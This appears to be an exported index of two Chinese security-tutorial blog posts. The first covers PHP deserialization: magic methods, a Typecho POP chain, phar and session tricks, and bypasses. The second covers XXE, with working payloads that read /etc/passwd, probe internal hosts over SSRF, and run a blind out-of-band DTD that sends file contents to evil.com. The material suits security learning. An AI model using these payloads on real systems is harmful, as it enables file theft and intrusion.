[{"content":"距离第一次学习php反序列已经很长时间了，初次学习时就学的迷迷糊糊，有很多理解不到位的地方，正好最近有时间打算回过头重新开始学习一遍，理解不到位之处请各位大佬多多指正。\n为什么需要序列化和反序列化？ 网络传输只能处理位流(Bytes) , 当你在java,php,python中定义一个复杂的用户对象，但是路由器并不认识，只能通过序列化成字符串的方式以字节流的方式传输，传输流程大致如下：\n服务器对象\u0026ndash;\u0026gt; 序列化\u0026ndash;\u0026gt; 字节流\u0026ndash;\u0026gt; 网络传输\u0026ndash;\u0026gt; 反序列化\u0026ndash;\u0026gt; 客户端\n内存(RAM)易失，程序运行在内存中，一旦断电，关闭数据就会消失\nphp中的序列化反序列化函数 序列化：serialize()\n反序列化：unserialize()\n漏洞利用 前提: 服务端(不论是当前代码还是所包含的代码中)必须要有对象(序列化形式)所对应的类, 否则无法反序列化\n例如: payload:O:1:\u0026quot;**S**\u0026quot;:1:{s:4:\u0026quot;test\u0026quot;;s:29:\u0026quot;\u0026lt;script\u0026gt;alert('xss')\u0026lt;/script\u0026gt;\u0026quot;;} 这时候如果服务端没有一个叫做S的类, 就会反序列化失败\n所以说, 想要发起反序列化攻击, 必要条件之一: 必须知道服务端有哪些类\n魔术方法 注:加黑重点关注\n魔术方法 描述 __construct() 构造方法，当对象被实例化（new）时自动调用。 __destruct() 析构方法，当对象被销毁时自动调用。反序列化攻击中最常见的入口。 __call() 在对象上下文中调用一个不可访问或不存在的方法时触发。常用的跳板。 __callStatic() 在静态上下文中调用一个不可访问或不存在的方法时触发。 __get() 读取对象中不可访问（未定义或私有）的属性时触发。常用的跳板。 __set() 写入对象中不可访问（未定义或私有）的属性时触发。 __isset() 使用 isset() 或 empty() 检查对象中不可访问的属性时触发。 __unset() 使用 unset() 删除对象中不可访问的属性时触发。 __sleep() 当对象被 serialize() 序列化前触发，通常用于返回需要被序列化的属性列表。 __wakeup() 当对象被 unserialize() 反序列化时触发，常用于初始化资源。反序列化的“点火开关”。 __toString() 当对象被转换成字符串（如 echo 或拼接）时自动调用。核心跳板。 __invoke() 当尝试以函数方式调用对象（如 $obj()）时触发。常用的跳板。 __clone() 当对象使用 clone 关键字被克隆时调用。 __serialize() PHP 7.4+ 引入。序列化前触发，优先级高于 __sleep。返回一个包含对象数据的数组。 __unserialize() PHP 7.4+ 引入。反序列化后触发，优先级高于 __wakeup。用于恢复对象状态。 __set_state() 当使用 var_export() 导出类时触发。必须是静态方法，返回类实例。 __debugInfo() 当使用 var_dump() 打印对象信息时触发，用于控制显示的属性。 1、 __construct() 和 __destruct()\n__construct() 是对象的构造方法，用于在对象实例化时进行初始化操作；\n__destruct() 是析构方法，在对象销毁时自动调用\n\u0026lt;?php class Person { public $name; // 构造方法，当对象被实例化时自动调用。 public function __construct($name) { echo \u0026#34;__construct 初始化\u0026#34;.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; $this-\u0026gt;name = $name; echo \u0026#34;Constructing Person: \u0026#34; . $this-\u0026gt;name . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } // 析构方法，当对象被销毁时自动调用。 public function __destruct() { echo \u0026#34;__destruct 类执行完毕\u0026#34;.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;Destructing Person: \u0026#34; . $this-\u0026gt;name . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } } $person = new Person(\u0026#34;ZhangSan\u0026#34;); unset($person); // 显式销毁对象，执行__destruct() echo \u0026#34;执行完毕\u0026#34;.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; // 如果不销毁对象，在代码执行结束时，也会执行__destruct() 输出： __construct 初始化 Constructing Person: ZhangSan __destruct 类执行完毕 Destructing Person: ZhangSan执行完毕 2、__sleep()和__wakeup()\n__sleep() 方法：当对象被序列化时自动调用，用于指定需要序列化的属性，并释放不必要的资源。\n__wakeup() 方法：当对象被反序列化时自动调用，用于重新初始化属性或资源（如恢复数据库连接）。\n\u0026lt;?php class User { public $name; public $email; private $dbConnection; public function __construct($name, $email) { $this-\u0026gt;name = $name; $this-\u0026gt;email = $email; $this-\u0026gt;dbConnection = $this-\u0026gt;connectToDatabase(); // 模拟数据库连接 } // 模拟数据库连接 private function connectToDatabase() { return \u0026#34;Database connection established\u0026#34;; } // 当对象被序列化时自动调用 public function __sleep() { echo \u0026#34;Serializing object...\u0026lt;br\u0026gt;\u0026#34;; // 关闭数据库连接（释放资源） $this-\u0026gt;dbConnection = null; // 只序列化 name 和 email 属性 return [\u0026#39;name\u0026#39;, \u0026#39;email\u0026#39;]; } // 当对象被反序列化时自动调用 public function __wakeup() { echo \u0026#34;Unserializing object...\u0026lt;br\u0026gt;\u0026#34;; // 恢复数据库连接 $this-\u0026gt;dbConnection = $this-\u0026gt;connectToDatabase(); } // 打印对象状态 public function showInfo() { echo \u0026#34;Name: \u0026#34; . $this-\u0026gt;name . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;Email: \u0026#34; . $this-\u0026gt;email . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;DB Connection: \u0026#34; . $this-\u0026gt;dbConnection . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } } $user = new User(\u0026#34;LiSi\u0026#34;, \u0026#34;lisi@example.com\u0026#34;); // 序列化对象，__sleep() 会被自动调用 $serializedUser = serialize($user); echo \u0026#34;Serialized String: \u0026#34; . $serializedUser . \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; // 反序列化对象，__wakeup() 会被自动调用 $unserializedUser = unserialize($serializedUser); $unserializedUser-\u0026gt;showInfo(); ?\u0026gt; 解析：\n创建对象 User：\n使用 User 类创建一个包含 name、email 和 dbConnection 属性的对象。 dbConnection 属性模拟数据库连接。 序列化时调用 __sleep()：\n当使用 serialize($user) 时，__sleep() 方法被自动调用。 在 __sleep() 中，我们将 dbConnection 属性设置为 null（表示释放该资源）。 只返回 ['name', 'email']，表示只序列化 name 和 email 两个属性，dbConnection 被排除在外。 生成的序列化字符串：\nSerialized String: O:4:\u0026quot;User\u0026quot;:2:{s:4:\u0026quot;name\u0026quot;;s:5:\u0026quot;Alice\u0026quot;;s:5:\u0026quot;email\u0026quot;;s:17:\u0026quot;alice@example.com\u0026quot;;} 只包含 name 和 email 属性，没有 dbConnection 属性。 反序列化时调用 __wakeup()：\n当使用 unserialize($serializedUser) 时，__wakeup() 方法被自动调用。 在 __wakeup() 中，我们重新初始化 dbConnection，表示恢复数据库连接。 输出对象状态：\n使用 showInfo() 方法打印对象的状态。 可以看到 dbConnection 已恢复为 \u0026quot;Database connection established\u0026quot;，表示反序列化后连接被恢复。 3、__get() 和 __set() 允许拦截对不可访问属性的读取和写入操作。\n\u0026lt;?php class Student { private $data = []; // 写入对象中不可访问（未定义或私有）的属性时触发 // 该方法接收两个参数： // $name：被设置的属性名（name）。 // $value：被设置的属性值（\u0026#34;ZhangSan\u0026#34;）。 public function __set($name, $value) { echo \u0026#34;Setting \u0026#39;$name\u0026#39; to \u0026#39;$value\u0026#39;\\n\u0026#34;; $this-\u0026gt;data[$name] = $value; } // 读取对象中不可访问（未定义或私有）的属性时触发 public function __get($name) { echo \u0026#34;Getting \u0026#39;$name\u0026#39;\\n\u0026#34;; return isset($this-\u0026gt;data[$name]) ? $this-\u0026gt;data[$name] : null; } } $student = new Student(); $student-\u0026gt;name = \u0026#34;ZhangSan\u0026#34;; // 调用 __set() 为__set($name, $value)赋值 echo $student-\u0026gt;name . PHP_EOL; // 调用 __get() 4、__call()用于处理对象中不存在或不可访问的方法调用；__callStatic() 用于处理对象中不存在或不可访问的静态方法调用。\n\u0026lt;?php class Test { // 当调用对象中不存在或不可访问的非静态方法时触发 public function __call($name, $args) { echo \u0026#34;调用了非静态方法: $name\\n\u0026#34;; echo \u0026#34;参数: \u0026#34; . implode(\u0026#39;, \u0026#39;, $args) . \u0026#34;\\n\u0026#34;; } // 当调用对象中不存在或不可访问的静态方法时触发 public static function __callStatic($method, $args) { echo \u0026#34;调用了静态方法: $method\\n\u0026#34;; echo \u0026#34;参数: \u0026#34; . implode(\u0026#39;, \u0026#39;, $args) . \u0026#34;\\n\u0026#34;; } } // 实例化对象 $obj = new Test(); // 触发 __call() $obj-\u0026gt;undefinedMethod(\u0026#39;hello\u0026#39;, 123); // 触发 __callStatic() Test::undefinedStaticMethod(\u0026#39;world\u0026#39;, 456); 5、__isset() 和 __unset() 是 PHP 的两个魔术方法，分别用于拦截对对象中未定义或不可访问属性进行 isset() 检查和 unset() 删除操作时的行为\n\u0026lt;?php class User { private $data = []; public function __set($name, $value) { $this-\u0026gt;data[$name] = $value; } // 当尝试用 isset()/empty() 检查属性时触发 public function __isset($name) { echo \u0026#34;__isset($name) 被调用\\n\u0026#34;; return isset($this-\u0026gt;data[$name]); } // 当尝试用 unset() 删除属性时触发 public function __unset($name) { echo \u0026#34;__unset($name) 被调用\\n\u0026#34;; unset($this-\u0026gt;data[$name]); } } $user = new User(); // 动态设置属性（实际存入 $data 数组） $user-\u0026gt;name = \u0026#34;WangWu\u0026#34;; // 触发 __isset(\u0026#39;name\u0026#39;) var_dump(isset($user-\u0026gt;name)); // 输出 true // 触发 __unset(\u0026#39;name\u0026#39;) unset($user-\u0026gt;name); ?\u0026gt; 6、__toString() 允许对象在被转换为字符串时的自定义输出。常用于调试或日志记录。\n\u0026lt;?php class Book { private $bookTitle; public function __construct($name) { $this-\u0026gt;bookTitle = $name; } public function __toString() { return \u0026#34;Book title: \u0026#34; . $this-\u0026gt;bookTitle; } } $book = new Book(\u0026#34;PHP Magic Methods\u0026#34;); echo $book; // 调用 __toString() ?\u0026gt; 7、__invoke() 允许对象像函数一样被调用。\n\u0026lt;?php class CallableClass { public function __invoke($x) { return $x * $x; } } $obj = new CallableClass(); echo $obj(5); // 调用 __invoke() ?\u0026gt; 8、__clone() 方法在对象被克隆时调用，用于实现深拷贝或进行自定义操作。\n\u0026lt;?php class Prototype { public $name; public function __construct($name1) { $this-\u0026gt;name = $name1; } public function __clone() { echo \u0026#34;Cloning object: \u0026#34; . $this-\u0026gt;name . PHP_EOL; } } $original = new Prototype(\u0026#34;Test\u0026#34;); $cloned = clone $original; // 调用 __clone() ?\u0026gt; 学会看序列化后的数据 一个例子： \u0026lt;?php $data = array(\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;John\u0026#39;, \u0026#39;age\u0026#39; =\u0026gt; 30, \u0026#39;skills\u0026#39; =\u0026gt; array(\u0026#39;PHP\u0026#39;, \u0026#39;Java\u0026#39;)); $serializedData = serialize($data); echo $serializedData; a:3:{s:4:\u0026#34;name\u0026#34;;s:4:\u0026#34;John\u0026#34;;s:3:\u0026#34;age\u0026#34;;i:30;s:6:\u0026#34;skills\u0026#34;;a:2:{i:0;s:3:\u0026#34;PHP\u0026#34;;i:1;s:4:\u0026#34;Java\u0026#34;;}} a - array 数组型 b - boolean 布尔型 d - double 浮点型 i - integer 整数型 o - common object 共同对象 r - objec reference 对象引用 s - non-escaped binary string 非转义的二进制字符串 S - escaped binary string 转义的二进制字符串 C - custom object 自定义对象 O - class 对象 N - null 空 R - pointer reference 指针引用 U - unicode string Unicode 编码的字符串 实战案例(Typecho 反序列化漏洞) 漏洞的入口在install.php文件中，而在执行unserialize之前还做了两个判断\n第一个是判断有没有安装，另一个检查refer头必须是站内url\n从Cookie中获取__typecho_config字段的值，进行base64解码，之后反序列化 找到入口后我们再找怎么利用，想要利用就要有相应的魔术方法配合\n__destruct()\t对象销毁调用 __wakeup()\t反序列化调用 __toString()\t对象转换成字符串调用 继续往下看$config我们是可控的，如果我们再adapter传入一个类，就可以触发__toString方法\n搜索__toString(),找到三个\n一个一个看首先config.php,没有价值\n看Query.php\n都在拼接sql语句，跳不出去\n看Feed.php\n调用了$item['author']-\u0026gt;screenName，这是一个当前类的私有变量.\n想要跳到另一个执行危险函数的地方,需要找一个类，满足两个条件之一：\n它内部有一个叫screenName的属性，且执行了危险的操作（少见） 没有screenName属性，但是定义了__get()魔术方法，且最终会通向危险函数（常规思路） 那下一步思路就很明确了，全局搜索function __get，再request.php中找到\n继续跟进get方法\n这里去_params去读取值\n那么只要通过反序列化提前给_params赋值，比如 array('screenName' =\u0026gt; 'phpinfo();')。这样当 $key 为 screenName 时，$value 就变成了我们的恶意代码。\n再往下，检查值不能是数组，字符串长度大于零，然后直接丢进了_applyFilter方法，继续跟进\n这里的call_user_func是可控的，这里的$filter我们可以控制成任何的函数(system,exec等),$value就是塞进去执行的内容\n回顾一下pop链\n反序列化入口 (install.php) 触发点 (__toString) 跳板 (__get) 终点 (call_user_func + assert) 隐蔽的反序列化入口 常规反序列化必须依赖 unserialize() 函数，但以下两种技术可以绕过这个限制\nphar反序列化 核心原理： Phar (PHP Archive) 是 PHP 的一种归档文件格式（类似 Java 的 JAR）。PHP 在解析 Phar 文件中的元数据（Metadata）时，会自动进行反序列化。\n攻击条件：\n文件上传： 攻击者能上传文件（哪怕只能上传 .jpg，只要内容符合 Phar 格式即可）。 文件操作： 代码中存在文件系统函数（如 file_exists(), is_dir(), file_get_contents(), include() 等）。 协议控制： 参数可控，可以使用 phar:// 伪协议。 攻击流程：\n生成 Payload： 写一个 PHP 脚本，将恶意对象写入 Phar 文件的 Metadata 中。 伪装： 将生成的 .phar 文件改名为 .jpg（修改文件头绕过上传检测）。 触发： 利用 phar://path/to/evil.jpg/test 触发文件操作函数，PHP 会解析 Metadata，自动执行 unserialize()，触发 POP 链。 session反序列化 核心原理： PHP 存储 Session 数据有不同的“处理器（Handler）”。如果写入 Session 和 读取 Session 使用了不同的处理器，数据格式就会被误读，从而产生反序列化漏洞。\n常见处理器差异：\nphp (默认)：格式为 键名 | 序列化数据。例如：name|s:5:\u0026quot;alice\u0026quot;; php_serialize：格式为 经过 serialize() 的整个数组。例如：a:1:{s:4:\u0026quot;name\u0026quot;;s:5:\u0026quot;alice\u0026quot;;} 攻击逻辑（只有 php_serialize 写，php 读）：\n攻击者传入数据：|O:4:\u0026quot;User\u0026quot;:1:{...}（注意开头的竖线）。 写入时（php_serialize）：PHP 把它当做普通字符串保存。 读取时（php）：PHP 看到竖线 |，认为竖线前面是键名（为空），后面是需要反序列化的值。 结果：恶意的序列化字符串被还原成了对象。 原生类利用 1. SoapClient (SSRF + CRLF 注入) 场景： 目标服务器没有对外网的访问权限，但你想探测内网。 利用： SoapClient 的 __call 方法在调用不存在的方法时，会发起网络请求。通过构造 User-Agent 等参数，可以进行 SSRF 攻击，甚至利用 CRLF 注入攻击 Redis。\n2. Error / Exception (XSS) 场景： 想要执行 XSS，但找不到 echo 点。 利用： 这两个类都有 __toString 方法。当你反序列化一个 Error 对象并试图打印它时，它会输出报错信息（可能包含 HTML 标签），从而触发 XSS。\n3. SplFileObject (任意文件读取) 场景： 需要读取敏感文件。 利用： 该类在构造时可以直接打开文件，配合 __toString 或遍历操作可以读取文件内容。\n绕过 1. __wakeup 绕过 (CVE-2016-7124) 原理： 在 PHP 5 \u0026lt; 5.6.25 和 PHP 7 \u0026lt; 7.0.10 版本中，如果序列化字符串中表示对象属性个数的值大于真实的属性个数，__wakeup() 方法将不会被执行。\n实战用法： 很多安全代码会在 __wakeup 中清空恶意属性（如重置数据库连接）。\n正常：O:4:\u0026quot;User\u0026quot;:1:{s:4:\u0026quot;name\u0026quot;;s:5:\u0026quot;admin\u0026quot;;} (属性个数为 1) 绕过：O:4:\u0026quot;User\u0026quot;:2:{s:4:\u0026quot;name\u0026quot;;s:5:\u0026quot;admin\u0026quot;;} (改为 2，绕过 __wakeup) 2. 快速析构 (Fast Destruct) 原理： 正常情况下，对象在脚本执行结束时销毁。但如果我们在反序列化过程中让程序报错或结构异常，对象会被立即销毁，触发 __destruct。\n场景： 如果后续代码会检测并清空你的恶意对象，或者 throw Exception 中断执行，你需要在这个检查之前就触发 __destruct。 做法： 修改序列化数组的下标，或者移除结尾的大括号，制造语法错误。\n3. GC (垃圾回收) 触发 原理： 利用数组的引用赋值（例如让数组的某个元素引用数组本身），在反序列化完成后，由于引用计数机制，对象会被判定为垃圾而提前销毁。这是一种极其隐蔽的触发 __destruct 的方式。\n实战工具：PHPGGC PHPGGC (PHP Generic Gadget Chains) 是反序列化领域的“瑞士军刀”。它集成了 Laravel, Symfony, ThinkPHP, Yii 等主流框架的现成利用链。\n","permalink":"http://localhost:1313/posts/php_serialize/","summary":"\u003cp\u003e距离第一次学习php反序列已经很长时间了，初次学习时就学的迷迷糊糊，有很多理解不到位的地方，正好最近有时间打算回过头重新开始学习一遍，理解不到位之处请各位大佬多多指正。\u003c/p\u003e\n\u003ch3 id=\"为什么需要序列化和反序列化\"\u003e为什么需要序列化和反序列化？\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e网络传输只能处理位流(Bytes)\u003c/strong\u003e , 当你在java,php,python中定义一个复杂的用户对象，但是路由器并不认识，只能通过序列化成字符串的方式以字节流的方式传输，传输流程大致如下：\u003c/p\u003e\n\u003cp\u003e服务器对象\u0026ndash;\u0026gt; 序列化\u0026ndash;\u0026gt; 字节流\u0026ndash;\u0026gt; 网络传输\u0026ndash;\u0026gt; 反序列化\u0026ndash;\u0026gt; 客户端\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e内存(RAM)易失\u003c/strong\u003e，程序运行在内存中，一旦断电，关闭数据就会消失\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"php中的序列化反序列化函数\"\u003ephp中的序列化反序列化函数\u003c/h3\u003e\n\u003cp\u003e序列化：\u003ccode\u003eserialize()\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e反序列化：\u003ccode\u003eunserialize()\u003c/code\u003e\u003c/p\u003e\n\u003ch3 id=\"漏洞利用\"\u003e漏洞利用\u003c/h3\u003e\n\u003cp\u003e前提:  服务端(不论是当前代码还是所包含的代码中)必须要有对象(序列化形式)所对应的类, 否则无法反序列化\u003c/p\u003e\n\u003cp\u003e例如: \u003ccode\u003epayload:O:1:\u0026quot;**S**\u0026quot;:1:{s:4:\u0026quot;test\u0026quot;;s:29:\u0026quot;\u0026lt;script\u0026gt;alert('xss')\u0026lt;/script\u0026gt;\u0026quot;;} \u003c/code\u003e这时候如果服务端没有一个叫做S的类, 就会反序列化失败\u003c/p\u003e\n\u003cp\u003e所以说, 想要发起反序列化攻击, 必要条件之一: 必须知道服务端有哪些类\u003c/p\u003e\n\u003ch3 id=\"魔术方法\"\u003e魔术方法\u003c/h3\u003e\n\u003cp\u003e注:加黑重点关注\u003c/p\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003e\u003cstrong\u003e魔术方法\u003c/strong\u003e\u003c/th\u003e\n          \u003cth\u003e\u003cstrong\u003e描述\u003c/strong\u003e\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003cstrong\u003e\u003ccode\u003e__construct()\u003c/code\u003e\u003c/strong\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003cstrong\u003e构造方法\u003c/strong\u003e，当对象被实例化（\u003ccode\u003enew\u003c/code\u003e）时自动调用。\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003cstrong\u003e\u003ccode\u003e__destruct()\u003c/code\u003e\u003c/strong\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003cstrong\u003e析构方法\u003c/strong\u003e，当对象被销毁时自动调用。反序列化攻击中最常见的入口。\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003cstrong\u003e\u003ccode\u003e__call()\u003c/code\u003e\u003c/strong\u003e\u003c/td\u003e\n          \u003ctd\u003e在对象上下文中调用一个\u003cstrong\u003e不可访问或不存在的方法\u003c/strong\u003e时触发。常用的跳板。\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003cstrong\u003e\u003ccode\u003e__callStatic()\u003c/code\u003e\u003c/strong\u003e\u003c/td\u003e\n          \u003ctd\u003e在静态上下文中调用一个\u003cstrong\u003e不可访问或不存在的方法\u003c/strong\u003e时触发。\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003cstrong\u003e\u003ccode\u003e__get()\u003c/code\u003e\u003c/strong\u003e\u003c/td\u003e\n          \u003ctd\u003e读取对象中\u003cstrong\u003e不可访问（未定义或私有）的属性\u003c/strong\u003e时触发。常用的跳板。\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003cstrong\u003e\u003ccode\u003e__set()\u003c/code\u003e\u003c/strong\u003e\u003c/td\u003e\n          \u003ctd\u003e写入对象中\u003cstrong\u003e不可访问（未定义或私有）的属性\u003c/strong\u003e时触发。\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003cstrong\u003e\u003ccode\u003e__isset()\u003c/code\u003e\u003c/strong\u003e\u003c/td\u003e\n          \u003ctd\u003e使用 \u003ccode\u003eisset()\u003c/code\u003e 或 \u003ccode\u003eempty()\u003c/code\u003e 检查对象中不可访问的属性时触发。\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003cstrong\u003e\u003ccode\u003e__unset()\u003c/code\u003e\u003c/strong\u003e\u003c/td\u003e\n          \u003ctd\u003e使用 \u003ccode\u003eunset()\u003c/code\u003e 删除对象中不可访问的属性时触发。\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003cstrong\u003e\u003ccode\u003e__sleep()\u003c/code\u003e\u003c/strong\u003e\u003c/td\u003e\n          \u003ctd\u003e当对象被 \u003ccode\u003eserialize()\u003c/code\u003e 序列化前触发，通常用于返回需要被序列化的属性列表。\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003cstrong\u003e\u003ccode\u003e__wakeup()\u003c/code\u003e\u003c/strong\u003e\u003c/td\u003e\n          \u003ctd\u003e当对象被 \u003ccode\u003eunserialize()\u003c/code\u003e 反序列化时触发，常用于初始化资源。反序列化的“点火开关”。\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003cstrong\u003e\u003ccode\u003e__toString()\u003c/code\u003e\u003c/strong\u003e\u003c/td\u003e\n          \u003ctd\u003e当对象被转换成\u003cstrong\u003e字符串\u003c/strong\u003e（如 \u003ccode\u003eecho\u003c/code\u003e 或拼接）时自动调用。核心跳板。\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003cstrong\u003e\u003ccode\u003e__invoke()\u003c/code\u003e\u003c/strong\u003e\u003c/td\u003e\n          \u003ctd\u003e当尝试以\u003cstrong\u003e函数方式调用对象\u003c/strong\u003e（如 \u003ccode\u003e$obj()\u003c/code\u003e）时触发。常用的跳板。\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003cstrong\u003e\u003ccode\u003e__clone()\u003c/code\u003e\u003c/strong\u003e\u003c/td\u003e\n          \u003ctd\u003e当对象使用 \u003ccode\u003eclone\u003c/code\u003e 关键字被克隆时调用。\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003cstrong\u003e\u003ccode\u003e__serialize()\u003c/code\u003e\u003c/strong\u003e\u003c/td\u003e\n          \u003ctd\u003ePHP 7.4+ 引入。序列化前触发，优先级高于 \u003ccode\u003e__sleep\u003c/code\u003e。返回一个包含对象数据的数组。\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003cstrong\u003e\u003ccode\u003e__unserialize()\u003c/code\u003e\u003c/strong\u003e\u003c/td\u003e\n          \u003ctd\u003ePHP 7.4+ 引入。反序列化后触发，优先级高于 \u003ccode\u003e__wakeup\u003c/code\u003e。用于恢复对象状态。\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003cstrong\u003e\u003ccode\u003e__set_state()\u003c/code\u003e\u003c/strong\u003e\u003c/td\u003e\n          \u003ctd\u003e当使用 \u003ccode\u003evar_export()\u003c/code\u003e 导出类时触发。必须是静态方法，返回类实例。\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003cstrong\u003e\u003ccode\u003e__debugInfo()\u003c/code\u003e\u003c/strong\u003e\u003c/td\u003e\n          \u003ctd\u003e当使用 \u003ccode\u003evar_dump()\u003c/code\u003e 打印对象信息时触发，用于控制显示的属性。\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003e1、 \u003ccode\u003e__construct()\u003c/code\u003e 和 \u003ccode\u003e__destruct()\u003c/code\u003e\u003c/p\u003e","title":"PHP反序列化"},{"content":"XML漏洞 理论： xml是一种用来传输和存储数据的格式，长得有些像HTML\n\u0026lt;user\u0026gt; \u0026lt;username\u0026gt;admin\u0026lt;/username\u0026gt; \u0026lt;role\u0026gt;manager\u0026lt;/role\u0026gt; \u0026lt;/user\u0026gt; 要学习XML就要先学习DTD\n什么是DTD？\nDTD（文档类型定义）使用来定义xml文档的合法结构。重点在于DTD允许定义实体也就是Entity，而他也就是漏洞的根源\n他有些像编程语言中的变量，举两个例子\n内部实体 \u0026lt;!DOCTYPE root [ \u0026lt;!ENTITY name \u0026#34;h4xk0r\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;root\u0026gt;Hello \u0026amp;name;\u0026lt;/root\u0026gt; 外部实体----这是漏洞的核心，xml允许从外部通过url或文件路径加载数据 语法关键字 SYSTEM 或 PUBLIC \u0026lt;!DOCTYPE root[ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;root\u0026gt;\u0026amp;xxe;\u0026lt;root\u0026gt; 如果在实际过程中后端接收了你的XML，并且解析了\u0026amp;xxe这个变量，那么就可以通过构造SYSTEM后面的路径，让服务器读取文件，探测内网 实战向： 怎么去寻找漏洞点： 显式的XML接口：\n如果请求头是 Content-Type: application/xml 或 text/xml，且数据包体是 XML，那么可以直接插入payload进行测试，但是感觉现在很少了\n隐式接口（content-Type欺骗）：\n假设一个api接口是这样的： POST /api/login HTTP/1.1 Content-Type: application/json {\u0026#34;user\u0026#34;: \u0026#34;admin\u0026#34;, \u0026#34;pass\u0026#34;: \u0026#34;123\u0026#34;} 很多框架为了兼容性，会根据Content-Type切换解析器，所以我们构造payload POST /api/login HTTP/1.1 Content-Type: application/xml \u0026lt;-- 修改这里 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; ?\u0026gt; \u0026lt;user\u0026gt;admin\u0026lt;/user\u0026gt; \u0026lt;pass\u0026gt;123\u0026lt;/pass\u0026gt; 如果这时候服务器没有报错说明支持xml格式，那么就可以构造payload测试xxe漏洞了 文件上传（SVG与office）\u0026ndash;这个是比较容易被忽视的点\nsvg： 是一种图片格式的矢量图。微信头像，网站logo上传处\nExecl/Word（.xlsx/.docx）: 本质是ZIP包，解压后是XML。 简历上传，报表导入处\n实战payload 情况一：\n有回显的文件读取，页面会直接打印出来输入的命令\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;userHeader\u0026gt; \u0026lt;userName\u0026gt;\u0026amp;xxe;\u0026lt;/userName\u0026gt; \u0026lt;/userHeader\u0026gt; windows用file:///c:/windows/win.ini 情况二：\nSSRF内网探测端口或者web\n\u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;http://192.168.1.1:80/admin\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;user\u0026gt;\u0026amp;xxe;\u0026lt;/user\u0026gt; 情况三：\n盲注（OOB/Blind XXE）\u0026ndash; 常见\n页面不返回任何内容则需要使用带外攻击（OOB），这里需要参数实体，语法用%而不是\u0026amp;\n步骤如下：\nvps上http://example.com下创建文件evil.dtd内容如下\n\u0026lt;!ENTITY % file SYSTEM \u0026#34;file:///etc/passwd\u0026#34;\u0026gt; \u0026lt;!ENTITY % eval \u0026#34;\u0026lt;!ENTITY \u0026amp;#x25; exfiltrate SYSTEM \u0026#39;http://evil.com/?data=%file;\u0026#39;\u0026gt;\u0026#34;\u0026gt; %eval; (注意：% 是 % 的 HTML 转义，为了防止嵌套解析错误)\n发送payload (访问自己开的网站)\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE foo [ \u0026lt;!ENTITY % xxe SYSTEM \u0026#34;http://evil.com/evil.dtd\u0026#34;\u0026gt; %xxe; %exfiltrate; ]\u0026gt; \u0026lt;root\u0026gt;\u0026lt;/root\u0026gt; 原理解析：\n目标去指定的位置解析去找了我们vps上的文件，加载DTD文件，读取文件存入%file，目标发送请求，我们就可以在web日志中看到敏感文件\n扩展：svg图片上传payload\n创建svg文件，内容如下：\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt; \u0026lt;!DOCTYPE test [ \u0026lt;!ENTITY xxe SYSTEM \u0026#34;file:///etc/hostname\u0026#34; \u0026gt; ]\u0026gt; 